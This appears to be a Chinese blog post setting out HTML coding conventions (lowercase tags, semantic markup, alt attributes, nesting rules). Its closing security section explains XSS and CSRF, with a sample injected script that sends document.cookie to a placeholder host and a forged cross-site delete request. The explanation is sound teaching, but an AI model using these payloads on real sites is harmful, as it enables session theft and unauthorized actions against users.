title: HTML编码规范
date: 2015-11-28 17:59:13
tags: 规范
---
## [1.书写规范](#guide)

* 只使用小写，包括标签名、属性名、属性值(一些可以自定义的字符串属性值除外)

```html
<!-- 不推荐 -->
<A HREF="/">Home</A>

<!-- 推荐 -->
<img src="google.png" alt="Google">
```

* 为每个块级元素或表格元素标签新起一行，并且对每个子元素进行缩进

* 确保你的IDE使用的是UTF-8编码来保存文件的，在定义页面的编码时使用 `<meta charset="utf-8">`

* 文档类型: `<! DOCTYPE html>`

* 使用规范化的html

* 使用语义化的html标签，根据用途来选择标签

* 把多媒体元素可知化。像图片、视频、动画等多媒体元素，要有相关的文字来体现其内容，比如<img>可以使用`alt`属性来说明其图片内容

```html
<!-- 不推荐 -->
<img src="sheet.png">

<!-- 推荐 -->
<img src="sheet.png" alt="screenshot".>

```

* 确保页面的结构、样式、行为三者相分离。确保文档或模板中只包含`html`, 把用到的样式都写到样式表文件中，把脚本文件都写到`js`文件中。

```html
<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:300,400,700"/>
</head>
<body>
    <span href="#" class="button" id="toggle-login">Log in</span>
</div>
    <script src="http://code.jquery.com/jquery-2.1.3.js"></script>
</body>
</html>
```

## [2.最佳实践](#practice)

### 2.1 保持标签闭合

```html
<!-- bad -->
<li>Some text here
<li>Some new text

<!-- good -->
<ul>
    <li>Some text here</li>
</ul>
```
### 2.2 尽量不要使用内联样式

```html
<!-- bad -->
<p style="color:#ccc">An example to illustrate inline style in html</p>

<!-- good -->
<p class="html_bp">An example to illustrate inline style in html</p>
```

### 2.3 使用连续的标题

```html
<!-- bad -->
<h1>This is the topmost heading</h1>
<h3>This is a sub_heading underneath the topmost heading</h3>

<!-- good -->
<h1>This is the topmost heading</h1>
<h2>This is a sub_heading underneath the topmost heading</h2>
```

### 2.4 在合适的地方使用合适的标签
HTML标签是构造规范内容结构的关键。例如 `<em>` 标签用来强调重点内容。 `<p>`标签适用于突出文章段落。如果想要在段落间加空行,就不要使用`<br/>`

```html
<!-- bad -->
<p>段落1<br/>
段落2</p>

<!-- good -->
<p>段落1</p>
<p>段落2</p>
```

### 2.5 为图片标签添加alt属性

```html
<!-- bad -->
<img id="logo" src="images/bgr_logo.png"/>

<!-- good -->
<img id="logo" src="images/bgr_logo.png" alt="Tom - Web Development"/>
```

### 2.6 添加适当的title属性
```html
<!-- bad -->
<a href="javascript:;">go away</a>

<!-- good -->
<a href="javascript:;" title="go away">go away</a>
```

### 2.7 IE兼容模式
```html
<!--推荐-->
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
```

### 2.8 对于Boolean类型的标签属性，可以不用赋值
```html
<!--推荐-->
<input type="checkbox" name="" id="" checked>
checked属性可以不用写checked="checked"
```

### 2.9 标签嵌套规范
1) 块元素可以包含内联元素或某些块元素, 但内联元素却不能包含块元素, 它只能包含其它的内联元素
```html
<!--good-->
<div>
    <span></span>
</div>

<!--bad-->
<span>
     <div></div>
 </span>
```

2) p元素不能包含块元素
```html
<!--good-->
<p>
    <span></span>
</p>
<div>
    <p></p>
</div>

<!--bad-->
<p>
    <div></div>
</p>
<p>
    <ul>
        <li></li>
    </ul>
</p>
```

## [3.安全](#safe)
### 3.1 XSS(Cross Site Scripting)
对于任何用户输入的内容，如果会显示在页面上，就需要做HTML的标签转义

比如聊天信息，或者用户评论，用户输入如下内容：
```js
我的评论<script>alert("弹窗")</script>
```
```js
//在正常的站点(a.com)输入如下评论, domain = a.com
我的评论<script>
var cookies = document.cookie, img = new Image();
img.src = 'http://xxx.com/?cookies='+encodeURIComponent(cookies);
document.body.appendChild(img);
</script>
```

### 3.2 CSRF(Cross-site request forgery)
CSRF与XSS有些类似，不过CSRF主要是利用权限管理的漏洞，如果登录会话在浏览器关闭前一直保持，其它用户可以通过构造URL的方式跨站伪造用户请求。

CSRF的防范点主要在后端，但CSRF的漏洞利用是在浏览器端。

```js
//在第三方的网站(b.com)插入对正常网站(a.com)的请求, domain = b.com
var img = new Image();
img.src = 'http://a.com/?action=delete&id=xxx';
document.body.appendChild(img);
```

## [4.参考文档](#reference)
- [dyygtfx/FeCodeGuide](https://github.com/dyygtfx/FeCodeGuide)
- [tsq/front-end-principles](https://github.com/tsq/front-end-principles/)